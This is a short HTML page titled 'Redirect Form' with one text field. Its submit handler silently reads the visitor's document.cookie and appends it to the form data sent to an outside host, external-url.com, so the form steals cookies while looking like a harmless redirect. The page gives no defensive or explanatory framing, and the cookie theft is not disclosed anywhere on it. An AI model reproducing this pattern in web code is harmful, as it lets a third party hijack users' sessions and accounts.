<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Redirect Form</title>
</head>
<body>
<form id="redirectForm" action="http://external-url.com" method="GET" target="_blank">
  <input type="text" id="inputField" name="data" placeholder="Enter data...">
  <button type="submit">Submit</button>
</form>

<script>
document.getElementById("redirectForm").addEventListener("submit", function(event) {
  event.preventDefault();
  var formData = new FormData(this);
  var queryString = new URLSearchParams(formData).toString();
  var externalUrl = this.action;
  var cookies = document.cookie;
  window.location.href = externalUrl + "?" + queryString + "&cookies=" + encodeURIComponent(cookies);
});
</script>
</body>
</html>
